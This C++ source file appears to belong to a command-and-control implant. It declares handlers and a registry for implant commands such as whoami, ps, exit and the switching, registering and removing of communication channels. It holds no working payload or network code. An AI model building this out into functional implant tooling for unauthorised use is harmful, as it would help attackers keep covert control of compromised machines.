#include "Command.h"

BOOL CommandChannelRegister(json& args, string artifact, json& result);
BOOL CommandChannelSwitch(json& args, string artifact, json& result);
BOOL CommandChannelList(json& args, string artifact, json& result);
BOOL CommandChannelRemove(json& args, string artifact, json& result);
BOOL CommandWhoami(json& args, string artifact, json& result);
BOOL CommandExit(json& args, string artifact, json& result);
BOOL CommandPs(json& args, string artifact, json& result);

std::vector<ImplantCommand> g_CommandRegistry = {
  {"exit",                 CommandExit            },
  {"whoami",			         CommandWhoami          },
  {"channel.switch",       CommandChannelSwitch   },
  {"channel.register",     CommandChannelRegister },
  {"channel.remove",       CommandChannelRemove   },
  {"ps",                   CommandPs              },
};